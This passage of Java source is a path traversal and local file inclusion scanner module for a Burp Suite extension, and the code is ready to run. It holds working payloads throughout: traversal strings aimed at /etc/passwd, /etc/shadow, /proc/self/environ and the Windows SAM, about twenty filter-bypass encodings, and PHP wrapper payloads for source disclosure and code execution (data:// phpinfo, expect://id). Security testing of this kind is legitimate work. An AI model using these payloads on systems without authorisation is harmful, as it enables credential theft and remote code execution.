package com.omnistrike.modules.injection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.omnistrike.framework.CollaboratorManager;
import com.omnistrike.framework.DeduplicationStore;
import com.omnistrike.framework.FindingsStore;

import com.omnistrike.model.*;

import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Path Traversal / LFI Scanner
 * Tests all parameter types for local file inclusion and path traversal
 * with increasing depth, multiple encoding bypasses, and PHP wrapper detection.
 */
public class PathTraversalScanner implements ScanModule {

    private MontoyaApi api;
    private ModuleConfig config;
    private DeduplicationStore dedup;
    private FindingsStore findingsStore;
    private CollaboratorManager collaboratorManager;

    // Smart parameter selection: prioritize file-related parameter names
    private static final Pattern FILE_PARAM_PATTERN = Pattern.compile(
            "(?i)(file|path|page|include|template|doc|folder|dir|upload|download|filename|filepath|" +
                    "resource|url|src|load|read|fetch|content|document|report|config|log|img|image|" +
                    "attachment|name|location|view|layout|module|theme|lang|language)"
    );

    // Confirmed file read patterns
    private static final Pattern UNIX_PASSWD_PATTERN = Pattern.compile("root:[x*]:0:0:");
    private static final Pattern UNIX_HOSTNAME_PATTERN = Pattern.compile("^[a-zA-Z0-9][a-zA-Z0-9._-]+$", Pattern.MULTILINE);
    private static final Pattern UNIX_ENVIRON_PATTERN = Pattern.compile("(PATH=|HOME=|USER=|SHELL=)");
    private static final Pattern WIN_INI_PATTERN = Pattern.compile("\\[(fonts|extensions|mci extensions|files)\\]", Pattern.CASE_INSENSITIVE);
    private static final Pattern WIN_HOSTS_PATTERN = Pattern.compile("localhost", Pattern.CASE_INSENSITIVE);
    private static final Pattern PHP_INFO_PATTERN = Pattern.compile("(phpinfo\\(\\)|PHP Version|PHP Extension|Zend Engine)", Pattern.CASE_INSENSITIVE);
    private static final Pattern UNIX_SHADOW_PATTERN = Pattern.compile("root:\\$[0-9a-z]\\$|root:!:|root:\\*:");
    private static final Pattern UNIX_ISSUE_PATTERN = Pattern.compile("(Ubuntu|Debian|CentOS|Red Hat|Fedora|Alpine|Arch|SUSE|Gentoo|Linux)", Pattern.CASE_INSENSITIVE);
    private static final Pattern BASE64_PATTERN = Pattern.compile("^[A-Za-z0-9+/]{50,}={0,2}$", Pattern.MULTILINE);

    @Override
    public String getId() { return "path-traversal"; }

    @Override
    public String getName() { return "Path Traversal / LFI Scanner"; }

    @Override
    public String getDescription() {
        return "Path traversal and LFI detection: Unix/Windows file reads, encoding bypasses (double encoding, null byte, UTF-8 overlong), and PHP wrappers.";
    }

    @Override
    public ModuleCategory getCategory() { return ModuleCategory.INJECTION; }

    @Override
    public boolean isPassive() { return false; }

    @Override
    public void initialize(MontoyaApi api, ModuleConfig config) {
        this.api = api;
        this.config = config;
    }

    public void setDependencies(DeduplicationStore dedup, FindingsStore findingsStore,
                                 CollaboratorManager collaboratorManager) {
        this.dedup = dedup;
        this.findingsStore = findingsStore;
        this.collaboratorManager = collaboratorManager;
    }

    @Override
    public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
        HttpRequest request = requestResponse.request();
        String urlPath = extractPath(request.url());

        List<TraversalTarget> targets = extractTargets(request);

        for (TraversalTarget target : targets) {
            if (!dedup.markIfNew("path-traversal", urlPath, target.name)) continue;

            try {
                testTraversal(requestResponse, target);
            } catch (Exception e) {
                api.logging().logToError("Path traversal test error on " + target.name + ": " + e.getMessage());
            }
        }

        return Collections.emptyList();
    }

    private void testTraversal(HttpRequestResponse original, TraversalTarget target) throws InterruptedException {
        String url = original.request().url();
        int maxDepth = config.getInt("traversal.maxDepth", 10);

        // Phase 1: Baseline
        HttpRequestResponse baseline = sendPayload(original, target, target.originalValue);
        if (baseline == null || baseline.response() == null) return;
        String baselineBody = baseline.response().bodyToString();
        int baselineLen = baselineBody != null ? baselineBody.length() : 0;
        int baselineStatus = baseline.response().statusCode();

        // Phase 2: Unix traversal
        if (config.getBool("traversal.unix.enabled", true)) {
            if (testUnixTraversal(original, target, url, maxDepth, baselineBody, baselineLen)) return;
        }

        // Phase 3: Windows traversal
        if (config.getBool("traversal.windows.enabled", true)) {
            if (testWindowsTraversal(original, target, url, maxDepth, baselineBody, baselineLen)) return;
        }

        // Phase 4: Encoding bypass
        if (config.getBool("traversal.encodingBypass.enabled", true)) {
            if (testEncodingBypass(original, target, url, maxDepth, baselineBody, baselineLen)) return;
        }

        // Phase 5: PHP wrappers (only if PHP detected)
        if (config.getBool("traversal.phpWrappers.enabled", true) && isPhpTarget(original)) {
            testPhpWrappers(original, target, url, baselineBody, baselineLen);
        }
    }

    // ==================== PHASE 2: UNIX TRAVERSAL ====================

    private boolean testUnixTraversal(HttpRequestResponse original, TraversalTarget target,
                                       String url, int maxDepth, String baselineBody,
                                       int baselineLen) throws InterruptedException {
        String[][] unixFiles = {
                {"etc/passwd", "UNIX_PASSWD"},
                {"etc/hostname", "UNIX_HOSTNAME"},
                {"proc/self/environ", "UNIX_ENVIRON"},
                {"proc/self/cmdline", "UNIX_CMDLINE"},
                {"etc/shadow", "UNIX_SHADOW"},
                {"etc/issue", "UNIX_ISSUE"},
                {"etc/group", "UNIX_GROUP"},
                {"etc/resolv.conf", "UNIX_RESOLV"},
                {"proc/version", "UNIX_PROCVERSION"},
                {"proc/self/status", "UNIX_PROCSTATUS"},
                {"etc/os-release", "UNIX_OSRELEASE"},
                {"etc/crontab", "UNIX_CRONTAB"},
                {"etc/hosts", "UNIX_HOSTS"},
                {"proc/net/tcp", "UNIX_PROCTCP"},
                {"etc/nginx/nginx.conf", "UNIX_NGINX"},
                {"etc/apache2/apache2.conf", "UNIX_APACHE"},
        };

        for (String[] fileDef : unixFiles) {
            String targetFile = fileDef[0];
            String checkType = fileDef[1];

            for (int depth = 1; depth <= maxDepth; depth++) {
                String traversal = "../".repeat(depth) + targetFile;
                HttpRequestResponse result = sendPayload(original, target, traversal);
                if (result == null || result.response() == null) continue;

                // Skip error responses — file read should produce a 200, not a 4xx/5xx error page
                if (result.response().statusCode() >= 400) continue;

                String body = result.response().bodyToString();
                if (body == null) continue;

                ConfirmedRead confirmed = detectConfirmedRead(body, checkType, baselineBody);
                if (confirmed != null) {
                    findingsStore.addFinding(Finding.builder("path-traversal",
                                    "Path Traversal: " + targetFile + " Read Confirmed",
                                    Severity.CRITICAL, Confidence.CERTAIN)
                            .url(url).parameter(target.name)
                            .evidence("Payload: " + traversal + " | Match: " + confirmed.evidence)
                            .description("Local file read confirmed via path traversal. The file /" + targetFile
                                    + " was successfully read through parameter '" + target.name + "'.")
                            .remediation("Never use user input directly in file paths. Use a whitelist of allowed "
                                    + "files or IDs that map to server-side paths. Apply chroot/jail if applicable.")
                            .requestResponse(result)
                            .build());
                    return true;
                }
                perHostDelay();
            }
        }
        return false;
    }

    // ==================== PHASE 3: WINDOWS TRAVERSAL ====================

    private boolean testWindowsTraversal(HttpRequestResponse original, TraversalTarget target,
                                          String url, int maxDepth, String baselineBody,
                                          int baselineLen) throws InterruptedException {
        String[][] winFiles = {
                {"windows\\win.ini", "WIN_INI"},
                {"windows\\system32\\drivers\\etc\\hosts", "WIN_HOSTS"},
                {"boot.ini", "WIN_BOOTINI"},
                {"windows\\system.ini", "WIN_SYSTEMINI"},
                {"windows\\php.ini", "WIN_PHPINI"},
                {"inetpub\\wwwroot\\web.config", "WIN_WEBCONFIG"},
                {"windows\\debug\\NetSetup.log", "WIN_NETSETUP"},
                {"windows\\repair\\sam", "WIN_SAM"},
        };

        for (String[] fileDef : winFiles) {
            String targetFile = fileDef[0];
            String checkType = fileDef[1];

            for (int depth = 1; depth <= maxDepth; depth++) {
                String traversal = "..\\".repeat(depth) + targetFile;
                HttpRequestResponse result = sendPayload(original, target, traversal);
                if (result == null || result.response() == null) continue;

                // Skip error responses — file read should produce a 200, not a 4xx/5xx error page
                if (result.response().statusCode() >= 400) continue;

                String body = result.response().bodyToString();
                if (body == null) continue;

                ConfirmedRead confirmed = detectConfirmedRead(body, checkType, baselineBody);
                if (confirmed != null) {
                    findingsStore.addFinding(Finding.builder("path-traversal",
                                    "Path Traversal: " + targetFile + " Read Confirmed (Windows)",
                                    Severity.CRITICAL, Confidence.CERTAIN)
                            .url(url).parameter(target.name)
                            .evidence("Payload: " + traversal + " | Match: " + confirmed.evidence)
                            .description("Local file read confirmed via path traversal on a Windows target. "
                                    + "The file " + targetFile + " was successfully read.")
                            .remediation("Never use user input directly in file paths. Use a whitelist approach.")
                            .requestResponse(result)
                            .build());
                    return true;
                }
                perHostDelay();
            }
        }
        return false;
    }

    // ==================== PHASE 4: ENCODING BYPASS ====================

    private boolean testEncodingBypass(HttpRequestResponse original, TraversalTarget target,
                                        String url, int maxDepth, String baselineBody,
                                        int baselineLen) throws InterruptedException {
        int depth = Math.min(maxDepth, 6); // Use moderate depth for bypass attempts

        // Double URL encoding: %252e%252e%252f
        String doubleEncoded = "%252e%252e%252f".repeat(depth) + "etc/passwd";

        // Null byte injection (bypass extension checks)
        String nullByte = "../".repeat(depth) + "etc/passwd%00.png";

        // UTF-8 overlong encoding
        String utf8Overlong = "..%c0%af".repeat(depth) + "etc/passwd";

        // Path normalization bypasses
        String dotDotSlashSlash = "....//".repeat(depth) + "etc/passwd";
        String semicolonBypass = "..;/".repeat(depth) + "etc/passwd";

        // Also try Windows variants
        String doubleEncodedWin = "%252e%252e%255c".repeat(depth) + "windows\\win.ini";

        // Null byte with extension (bypass extension whitelist)
        String nullByteExt = "../".repeat(depth) + "etc/passwd%00.jpg";

        // Backslash normalization (IIS/Windows path normalization)
        String backslashNorm = "..\\".repeat(depth) + "etc/passwd";

        // URL-encoded dots (%2e%2e/)
        String urlEncodedDots = "%2e%2e/".repeat(depth) + "etc/passwd";

        // Full URL encoding of traversal sequence
        String fullUrlEncoded = "%2e%2e%2f".repeat(depth) + "etc/passwd";

        String[][] bypasses = {
                {doubleEncoded, "UNIX_PASSWD", "Double URL encoding"},
                {nullByte, "UNIX_PASSWD", "Null byte injection"},
                {utf8Overlong, "UNIX_PASSWD", "UTF-8 overlong encoding"},
                {dotDotSlashSlash, "UNIX_PASSWD", "Path normalization (....//)"} ,
                {semicolonBypass, "UNIX_PASSWD", "Semicolon bypass (..;/)"},
                {doubleEncodedWin, "WIN_INI", "Double URL encoding (Windows)"},
                {nullByteExt, "UNIX_PASSWD", "Null byte with extension bypass"},
                {backslashNorm, "UNIX_PASSWD", "Backslash normalization"},
                {urlEncodedDots, "UNIX_PASSWD", "URL-encoded dots (%2e%2e/)"},
                {fullUrlEncoded, "UNIX_PASSWD", "Full URL encoding (%2e%2e%2f)"},
                // Triple URL encoding
                {"%25252e%25252e%25252f".repeat(depth) + "etc/passwd", "UNIX_PASSWD", "Triple URL encoding"},
                // Mixed forward/backslash
                {"..\\./".repeat(depth) + "etc/passwd", "UNIX_PASSWD", "Mixed slash/backslash"},
                // Unicode normalization (U+2025 Two Dot Leader)
                {"\u2025/".repeat(depth) + "etc/passwd", "UNIX_PASSWD", "Unicode two-dot leader"},
                // IIS 8.3 short filename notation
                {"..\\".repeat(depth) + "WINDOW~1\\win.ini", "WIN_INI", "IIS 8.3 short filename"},
                // Double-dot with extra slashes
                {"..///".repeat(depth) + "etc/passwd", "UNIX_PASSWD", "Double-dot triple slash"},
                // Dot segments in middle
                {"/." + "/..".repeat(depth) + "/etc/passwd", "UNIX_PASSWD", "Leading dot + traversal"},
                // URL-encoded backslash
                {"%5c..%5c".repeat(depth) + "etc/passwd", "UNIX_PASSWD", "URL-encoded backslash (\\..\\)"},
                // Tab/space variants
                {"..%09/".repeat(depth) + "etc/passwd", "UNIX_PASSWD", "Tab byte in traversal"},
                // Reverse traversal (for some WAFs)
                {"/..\\.\\".repeat(depth) + "etc/passwd", "UNIX_PASSWD", "Reverse mixed traversal"},
                // UTF-8 full-width dot
                {"\uff0e\uff0e/".repeat(depth) + "etc/passwd", "UNIX_PASSWD", "UTF-8 fullwidth dots"},
        };

        for (String[] bypass : bypasses) {
            String payload = bypass[0];
            String checkType = bypass[1];
            String technique = bypass[2];

            HttpRequestResponse result = sendPayload(original, target, payload);
            if (result == null || result.response() == null) continue;

            // Skip error responses
            if (result.response().statusCode() >= 400) continue;

            String body = result.response().bodyToString();
            if (body == null) continue;

            ConfirmedRead confirmed = detectConfirmedRead(body, checkType, baselineBody);
            if (confirmed != null) {
                findingsStore.addFinding(Finding.builder("path-traversal",
                                "Path Traversal via " + technique,
                                Severity.CRITICAL, Confidence.CERTAIN)
                        .url(url).parameter(target.name)
                        .evidence("Payload: " + payload + " | Technique: " + technique
                                + " | Match: " + confirmed.evidence)
                        .description("Path traversal confirmed using encoding bypass technique: " + technique
                                + ". The server's path traversal filter was bypassed.")
                        .remediation("Canonicalize/normalize file paths before validating them. Use realpath() "
                                + "or equivalent to resolve the actual path, then check it against the allowed directory.")
                        .requestResponse(result)
                        .build());
                return true;
            }
            perHostDelay();
        }
        return false;
    }

    // ==================== PHASE 5: PHP WRAPPERS ====================

    private void testPhpWrappers(HttpRequestResponse original, TraversalTarget target,
                                  String url, String baselineBody, int baselineLen) throws InterruptedException {
        // php://filter base64 encoding — reads source code
        String filterPayload = "php://filter/convert.base64-encode/resource=index";
        HttpRequestResponse filterResult = sendPayload(original, target, filterPayload);
        if (filterResult != null && filterResult.response() != null) {
            String body = filterResult.response().bodyToString();
            if (body != null && !body.equals(baselineBody) && BASE64_PATTERN.matcher(body).find()) {
                findingsStore.addFinding(Finding.builder("path-traversal",
                                "LFI via php://filter — Source Code Disclosure",
                                Severity.CRITICAL, Confidence.CERTAIN)
                        .url(url).parameter(target.name)
                        .evidence("Payload: " + filterPayload + " | Response contains base64-encoded data")
                        .description("PHP filter wrapper successfully used to read source code. "
                                + "The response contains base64-encoded PHP source that can be decoded "
                                + "to reveal application source code, credentials, and logic.")
                        .remediation("Disable PHP stream wrappers (allow_url_include=Off). Never pass user "
                                + "input to include/require functions. Use a whitelist of includable files.")
                        .requestResponse(filterResult)
                        .build());
            }
        }
        perHostDelay();

        // data:// wrapper (code execution)
        String dataPayload = "data://text/plain,<?php phpinfo();?>";
        HttpRequestResponse dataResult = sendPayload(original, target, dataPayload);
        if (dataResult != null && dataResult.response() != null) {
            String body = dataResult.response().bodyToString();
            if (body != null && PHP_INFO_PATTERN.matcher(body).find()) {
                findingsStore.addFinding(Finding.builder("path-traversal",
                                "LFI to RCE via data:// Wrapper",
                                Severity.CRITICAL, Confidence.CERTAIN)
                        .url(url).parameter(target.name)
                        .evidence("Payload: " + dataPayload + " | phpinfo() output detected")
                        .description("PHP data:// wrapper successfully executed arbitrary PHP code. "
                                + "This is a full Remote Code Execution vulnerability via Local File Inclusion.")
                        .remediation("Set allow_url_include=Off in php.ini. Never pass user input to "
                                + "include/require functions.")
                        .requestResponse(dataResult)
                        .build());
            }
        }
        perHostDelay();

        // php://filter chain variant (read specific file)
        String filterChainPayload = "php://filter/read=convert.base64-encode/resource=/etc/passwd";
        HttpRequestResponse filterChainResult = sendPayload(original, target, filterChainPayload);
        if (filterChainResult != null && filterChainResult.response() != null) {
            String body = filterChainResult.response().bodyToString();
            if (body != null && !body.equals(baselineBody) && BASE64_PATTERN.matcher(body).find()) {
                findingsStore.addFinding(Finding.builder("path-traversal",
                                "LFI via php://filter chain — /etc/passwd",
                                Severity.CRITICAL, Confidence.CERTAIN)
                        .url(url).parameter(target.name)
                        .evidence("Payload: " + filterChainPayload + " | Response contains base64 data")
                        .description("PHP filter wrapper read /etc/passwd via explicit read= chain variant.")
                        .remediation("Disable PHP stream wrappers (allow_url_include=Off). Use a whitelist.")
                        .requestResponse(filterChainResult)
                        .build());
            }
        }
        perHostDelay();

        // php://input wrapper (POST body as include — code execution)
        String phpInputPayload = "php://input";
        HttpRequestResponse phpInputResult = sendPayload(original, target, phpInputPayload);
        if (phpInputResult != null && phpInputResult.response() != null) {
            String body = phpInputResult.response().bodyToString();
            // php://input echoes back POST body content — detect if response changed significantly
            if (body != null && !body.equals(baselineBody) && Math.abs(body.length() - baselineLen) > 50) {
                findingsStore.addFinding(Finding.builder("path-traversal",
                                "LFI via php://input — Potential Code Execution",
                                Severity.HIGH, Confidence.TENTATIVE)
                        .url(url).parameter(target.name)
                        .evidence("Payload: " + phpInputPayload + " | Response changed (len diff > 50)")
                        .description("php://input wrapper accepted. If the include executes PHP from POST body, "
                                + "this is a Remote Code Execution vulnerability.")
                        .remediation("Set allow_url_include=Off in php.ini.")
                        .requestResponse(phpInputResult)
                        .build());
            }
        }
        perHostDelay();

        // phar:// wrapper (deserialization via PHAR metadata)
        String pharPayload = "phar://./uploads/avatar.jpg/test.txt";
        HttpRequestResponse pharResult = sendPayload(original, target, pharPayload);
        if (pharResult != null && pharResult.response() != null) {
            String body = pharResult.response().bodyToString();
            if (body != null && !body.equals(baselineBody)
                    && pharResult.response().statusCode() != 404
                    && body.length() > baselineLen + 20) {
                findingsStore.addFinding(Finding.builder("path-traversal",
                                "LFI via phar:// Wrapper — Potential Deserialization",
                                Severity.HIGH, Confidence.TENTATIVE)
                        .url(url).parameter(target.name)
                        .evidence("Payload: " + pharPayload + " | Response significantly changed")
                        .description("phar:// wrapper accepted. If a PHAR file can be uploaded, "
                                + "its metadata is deserialized on access, enabling RCE via gadget chains.")
                        .remediation("Disable phar:// wrapper. Use stream_wrapper_unregister('phar').")
                        .requestResponse(pharResult)
                        .build());
            }
        }
        perHostDelay();

        // expect:// wrapper (command execution)
        String expectPayload = "expect://id";
        HttpRequestResponse expectResult = sendPayload(original, target, expectPayload);
        if (expectResult != null && expectResult.response() != null) {
            String body = expectResult.response().bodyToString();
            if (body != null && body.contains("uid=") && body.contains("gid=")) {
                findingsStore.addFinding(Finding.builder("path-traversal",
                                "LFI to RCE via expect:// Wrapper",
                                Severity.CRITICAL, Confidence.CERTAIN)
                        .url(url).parameter(target.name)
                        .evidence("Payload: " + expectPayload + " | Command output: uid=...gid=...")
                        .description("PHP expect:// wrapper executed an OS command. This is a full Remote "
                                + "Code Execution vulnerability.")
                        .remediation("Disable the expect extension. Set allow_url_include=Off.")
                        .requestResponse(expectResult)
                        .build());
            }
        }
        perHostDelay();

        // zip:// wrapper (if ZIP file can be uploaded)
        String zipPayload = "zip://./uploads/avatar.jpg%23test.txt";
        HttpRequestResponse zipResult = sendPayload(original, target, zipPayload);
        if (zipResult != null && zipResult.response() != null) {
            String body = zipResult.response().bodyToString();
            if (body != null && !body.equals(baselineBody)
                    && zipResult.response().statusCode() != 404
                    && body.length() > baselineLen + 20) {
                findingsStore.addFinding(Finding.builder("path-traversal",
                                "LFI via zip:// Wrapper",
                                Severity.HIGH, Confidence.TENTATIVE)
                        .url(url).parameter(target.name)
                        .evidence("Payload: " + zipPayload + " | Response changed")
                        .description("zip:// wrapper accepted. If a ZIP file can be uploaded, "
                                + "its contents can be read via this wrapper.")
                        .remediation("Disable zip:// wrapper. Use stream_wrapper_unregister('zip').")
                        .requestResponse(zipResult)
                        .build());
            }
        }
        perHostDelay();

        // php://filter with ROT13
        String rot13Payload = "php://filter/read=string.rot13/resource=index";
        HttpRequestResponse rot13Result = sendPayload(original, target, rot13Payload);
        if (rot13Result != null && rot13Result.response() != null) {
            String body = rot13Result.response().bodyToString();
            if (body != null && !body.equals(baselineBody) && body.length() > baselineLen + 20
                    && rot13Result.response().statusCode() == 200) {
                findingsStore.addFinding(Finding.builder("path-traversal",
                                "LFI via php://filter (ROT13) — Source Code Disclosure",
                                Severity.CRITICAL, Confidence.FIRM)
                        .url(url).parameter(target.name)
                        .evidence("Payload: " + rot13Payload + " | Response contains ROT13-encoded data")
                        .description("PHP filter wrapper with ROT13 encoding used to read source code.")
                        .remediation("Disable PHP stream wrappers. Use a whitelist of includable files.")
                        .requestResponse(rot13Result)
                        .build());
            }
        }
        perHostDelay();

        // php://filter with zlib compression
        String zlibPayload = "php://filter/zlib.deflate/resource=/etc/passwd";
        HttpRequestResponse zlibResult = sendPayload(original, target, zlibPayload);
        if (zlibResult != null && zlibResult.response() != null) {
            String body = zlibResult.response().bodyToString();
            if (body != null && !body.equals(baselineBody) && body.length() != baselineLen
                    && zlibResult.response().statusCode() == 200) {
                findingsStore.addFinding(Finding.builder("path-traversal",
                                "LFI via php://filter (zlib) — File Read",
                                Severity.HIGH, Confidence.TENTATIVE)
                        .url(url).parameter(target.name)
                        .evidence("Payload: " + zlibPayload + " | Response changed with zlib filter")
                        .description("PHP filter wrapper with zlib compression returned modified content.")
                        .remediation("Disable PHP stream wrappers (allow_url_include=Off).")
                        .requestResponse(zlibResult)
                        .build());
            }
        }
        perHostDelay();

        // data:// with base64 encoded PHP
        String dataB64Payload = "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==";
        HttpRequestResponse dataB64Result = sendPayload(original, target, dataB64Payload);
        if (dataB64Result != null && dataB64Result.response() != null) {
            String body = dataB64Result.response().bodyToString();
            if (body != null && PHP_INFO_PATTERN.matcher(body).find()) {
                findingsStore.addFinding(Finding.builder("path-traversal",
                                "LFI to RCE via data:// (Base64) Wrapper",
                                Severity.CRITICAL, Confidence.CERTAIN)
                        .url(url).parameter(target.name)
                        .evidence("Payload: " + dataB64Payload + " | phpinfo() output detected")
                        .description("PHP data:// wrapper with base64 encoding executed PHP code.")
                        .remediation("Set allow_url_include=Off in php.ini.")
                        .requestResponse(dataB64Result)
                        .build());
            }
        }
        perHostDelay();
    }

    // ==================== TARGET EXTRACTION ====================

    private List<TraversalTarget> extractTargets(HttpRequest request) {
        List<TraversalTarget> targets = new ArrayList<>();

        // Query parameters
        for (var param : request.parameters()) {
            if (!FILE_PARAM_PATTERN.matcher(param.name()).find()) continue;
            switch (param.type()) {
                case URL:
                    targets.add(new TraversalTarget(param.name(), param.value(), TargetType.QUERY));
                    break;
                case BODY:
                    targets.add(new TraversalTarget(param.name(), param.value(), TargetType.BODY));
                    break;
                case COOKIE:
                    targets.add(new TraversalTarget(param.name(), param.value(), TargetType.COOKIE));
                    break;
            }
        }

        // Also check params with file-like values (containing / or \ or extensions)
        for (var param : request.parameters()) {
            if (param.value() != null && (param.value().contains("/") || param.value().contains("\\")
                    || param.value().matches(".*\\.[a-zA-Z]{2,5}$"))) {
                TargetType type;
                switch (param.type()) {
                    case URL: type = TargetType.QUERY; break;
                    case COOKIE: type = TargetType.COOKIE; break;
                    default: type = TargetType.BODY; break;
                }
                TraversalTarget t = new TraversalTarget(param.name(), param.value(), type);
                if (!targets.contains(t)) targets.add(t);
            }
        }

        // JSON body values
        String ct = "";
        for (var h : request.headers()) {
            if (h.name().equalsIgnoreCase("Content-Type")) { ct = h.value(); break; }
        }
        if (ct.contains("application/json")) {
            try {
                String body = request.bodyToString();
                if (body != null) {
                    com.google.gson.JsonElement el = com.google.gson.JsonParser.parseString(body);
                    if (el.isJsonObject()) {
                        extractJsonTargets(el.getAsJsonObject(), "", targets);
                    }
                }
            } catch (Exception ignored) {}
        }

        return targets;
    }

    private void extractJsonTargets(com.google.gson.JsonObject obj, String prefix, List<TraversalTarget> targets) {
        for (String key : obj.keySet()) {
            com.google.gson.JsonElement val = obj.get(key);
            String fullKey = prefix.isEmpty() ? key : prefix + "." + key;
            if (val.isJsonPrimitive() && val.getAsJsonPrimitive().isString()) {
                String v = val.getAsString();
                if (FILE_PARAM_PATTERN.matcher(key).find()
                        || v.contains("/") || v.contains("\\")
                        || v.matches(".*\\.[a-zA-Z]{2,5}$")) {
                    targets.add(new TraversalTarget(fullKey, v, TargetType.JSON));
                }
            } else if (val.isJsonObject()) {
                extractJsonTargets(val.getAsJsonObject(), fullKey, targets);
            }
        }
    }

    // ==================== DETECTION HELPERS ====================

    private ConfirmedRead detectConfirmedRead(String body, String checkType, String baselineBody) {
        // Avoid false positives: if the baseline already contains the pattern, skip
        switch (checkType) {
            case "UNIX_PASSWD": {
                Matcher m = UNIX_PASSWD_PATTERN.matcher(body);
                if (m.find() && (baselineBody == null || !UNIX_PASSWD_PATTERN.matcher(baselineBody).find())) {
                    return new ConfirmedRead("root:x:0:0 found in response");
                }
                break;
            }
            case "UNIX_HOSTNAME": {
                // Only valid if response body is very short (just a hostname)
                if (body.trim().length() < 256 && body.trim().length() > 1
                        && UNIX_HOSTNAME_PATTERN.matcher(body.trim()).matches()
                        && (baselineBody == null || !body.trim().equals(baselineBody.trim()))) {
                    return new ConfirmedRead("/etc/hostname content: " + body.trim());
                }
                break;
            }
            case "UNIX_ENVIRON": {
                if (UNIX_ENVIRON_PATTERN.matcher(body).find()
                        && (baselineBody == null || !UNIX_ENVIRON_PATTERN.matcher(baselineBody).find())) {
                    return new ConfirmedRead("Environment variables (PATH=, HOME=, etc.) found");
                }
                break;
            }
            case "UNIX_CMDLINE": {
                // /proc/self/cmdline contains null-separated strings
                if (body.contains("\0") || (body.length() > 5 && body.length() < 10000
                        && !body.equals(baselineBody) && body.matches("(?s).*[a-z/]+.*"))) {
                    // Weak signal, don't confirm unless clearly different
                    break;
                }
                break;
            }
            case "WIN_INI": {
                if (WIN_INI_PATTERN.matcher(body).find()
                        && (baselineBody == null || !WIN_INI_PATTERN.matcher(baselineBody).find())) {
                    return new ConfirmedRead("[fonts] or [extensions] section found (win.ini)");
                }
                break;
            }
            case "WIN_HOSTS": {
                if (WIN_HOSTS_PATTERN.matcher(body).find() && body.contains("127.0.0.1")
                        && (baselineBody == null || !baselineBody.contains("127.0.0.1"))) {
                    return new ConfirmedRead("Windows hosts file content (127.0.0.1 localhost)");
                }
                break;
            }
            case "UNIX_SHADOW": {
                if (UNIX_SHADOW_PATTERN.matcher(body).find()
                        && (baselineBody == null || !UNIX_SHADOW_PATTERN.matcher(baselineBody).find())) {
                    return new ConfirmedRead("/etc/shadow content: password hashes found");
                }
                break;
            }
            case "UNIX_ISSUE": {
                if (body.trim().length() < 512 && body.trim().length() > 3
                        && UNIX_ISSUE_PATTERN.matcher(body).find()
                        && (baselineBody == null || !UNIX_ISSUE_PATTERN.matcher(baselineBody).find())) {
                    return new ConfirmedRead("/etc/issue content: " + body.trim().substring(0, Math.min(80, body.trim().length())));
                }
                break;
            }
            case "UNIX_GROUP": {
                if (body.contains("root:") && body.contains(":0:")
                        && (baselineBody == null || !baselineBody.contains("root:"))) {
                    return new ConfirmedRead("/etc/group content: root group found");
                }
                break;
            }
            case "UNIX_RESOLV": {
                if ((body.contains("nameserver") || body.contains("search"))
                        && (baselineBody == null || !baselineBody.contains("nameserver"))) {
                    return new ConfirmedRead("/etc/resolv.conf content: nameserver entries found");
                }
                break;
            }
            case "UNIX_PROCVERSION": {
                Pattern procVersionPattern = Pattern.compile("Linux version \\d+\\.\\d+");
                if (procVersionPattern.matcher(body).find()
                        && (baselineBody == null || !procVersionPattern.matcher(baselineBody).find())) {
                    return new ConfirmedRead("/proc/version content: Linux version found");
                }
                break;
            }
            case "UNIX_PROCSTATUS": {
                if ((body.contains("Name:") && body.contains("VmSize:"))
                        && (baselineBody == null || !baselineBody.contains("VmSize:"))) {
                    return new ConfirmedRead("/proc/self/status content: process info found");
                }
                break;
            }
            case "UNIX_OSRELEASE": {
                if ((body.contains("NAME=") || body.contains("VERSION=") || body.contains("ID="))
                        && (baselineBody == null || !baselineBody.contains("NAME="))) {
                    return new ConfirmedRead("/etc/os-release content found");
                }
                break;
            }
            case "UNIX_CRONTAB": {
                if ((body.contains("cron") || body.contains("* * *") || body.contains("SHELL="))
                        && (baselineBody == null || !baselineBody.contains("SHELL="))) {
                    return new ConfirmedRead("/etc/crontab content found");
                }
                break;
            }
            case "UNIX_HOSTS": {
                if (body.contains("127.0.0.1") && body.contains("localhost")
                        && (baselineBody == null || !baselineBody.contains("127.0.0.1"))) {
                    return new ConfirmedRead("/etc/hosts content: localhost entry found");
                }
                break;
            }
            case "UNIX_PROCTCP": {
                Pattern tcpPattern = Pattern.compile("\\d+:\\s+[0-9A-F]+:[0-9A-F]+");
                if (tcpPattern.matcher(body).find()
                        && (baselineBody == null || !tcpPattern.matcher(baselineBody).find())) {
                    return new ConfirmedRead("/proc/net/tcp content: TCP connection entries found");
                }
                break;
            }
            case "UNIX_NGINX": {
                if ((body.contains("server") && (body.contains("listen") || body.contains("location")))
                        && (baselineBody == null || !baselineBody.contains("listen"))) {
                    return new ConfirmedRead("nginx.conf content: server block found");
                }
                break;
            }
            case "UNIX_APACHE": {
                if ((body.contains("ServerRoot") || body.contains("DocumentRoot") || body.contains("ServerName"))
                        && (baselineBody == null || !baselineBody.contains("ServerRoot"))) {
                    return new ConfirmedRead("apache2.conf content: Apache config found");
                }
                break;
            }
            case "WIN_BOOTINI": {
                if ((body.contains("[boot loader]") || body.contains("multi("))
                        && (baselineBody == null || !baselineBody.contains("[boot loader]"))) {
                    return new ConfirmedRead("boot.ini content found");
                }
                break;
            }
            case "WIN_SYSTEMINI": {
                if ((body.contains("[drivers]") || body.contains("[386Enh]"))
                        && (baselineBody == null || !baselineBody.contains("[drivers]"))) {
                    return new ConfirmedRead("system.ini content found");
                }
                break;
            }
            case "WIN_PHPINI": {
                if ((body.contains("[PHP]") || body.contains("extension_dir") || body.contains("display_errors"))
                        && (baselineBody == null || !baselineBody.contains("[PHP]"))) {
                    return new ConfirmedRead("php.ini content found");
                }
                break;
            }
            case "WIN_WEBCONFIG": {
                if ((body.contains("<configuration>") || body.contains("connectionString") || body.contains("appSettings"))
                        && (baselineBody == null || !baselineBody.contains("<configuration>"))) {
                    return new ConfirmedRead("web.config content found");
                }
                break;
            }
            case "WIN_NETSETUP": {
                if ((body.contains("NetpDoDomainJoin") || body.contains("NetSetup"))
                        && (baselineBody == null || !baselineBody.contains("NetSetup"))) {
